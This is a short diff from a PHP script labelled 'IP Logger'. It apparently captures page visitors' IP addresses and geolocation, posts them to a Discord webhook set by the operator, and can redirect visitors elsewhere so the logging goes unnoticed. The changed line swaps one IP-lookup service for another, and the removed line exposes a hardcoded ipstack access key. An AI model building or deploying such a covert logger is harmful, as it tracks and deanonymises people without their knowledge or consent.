@@ -6,7 +6,7 @@ $url = "Your Discord Webhook Link Here";
 // If you want to redirect to another page, paste the link below and delete the //.
 // header("Location: http://example.com");
 
-$iplookup = file_get_contents("http://api.ipstack.com/{$ip}?access_key=222e8ef8610fe1210b54897b3100631d&format=1");
+$iplookup = file_get_contents("http://extreme-ip-lookup.com/json/");
 
 $hookObject = json_encode([
     "username" => "IP Logger ",
